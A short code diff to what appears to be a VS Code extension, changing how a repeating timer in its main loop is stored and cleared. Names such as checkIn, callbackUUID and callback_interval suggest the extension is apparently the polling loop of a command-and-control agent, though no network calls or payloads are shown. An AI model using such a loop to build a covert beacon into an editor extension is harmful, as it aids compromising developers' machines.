@@ -67,9 +67,7 @@ function mainLoop(context) {
 	const mustExit = context.globalState.get('mustExit')
 
 	if (mustExit != null) {
-		// Find ID for main loop and stop it
-		const intervalID = context.globalState.get('intervalID')
-		clearInterval(intervalID)
+		clearInterval(this)
 
 		// Clear out the exit instruction
 		context.globalState.update('mustExit', null)
@@ -149,15 +147,12 @@ function activate(context) {
 	const callbackUUID = context.globalState.get('productID')
 	// Build parameter is in seconds, setInterval() wants milliseconds
 	const interval = callback_interval * 1000
-	var intervalID
 
 	if (callbackUUID != null) {
-		intervalID = setInterval(mainLoop, interval, context);
-		context.globalState.update('intervalID', intervalID);
+		setInterval(mainLoop, interval, context);
 	} else {
 		checkIn(context);
-		intervalID = setInterval(mainLoop, interval, context);
-		context.globalState.update('intervalID', intervalID);
+		setInterval(mainLoop, interval, context);
 	}
 }
 
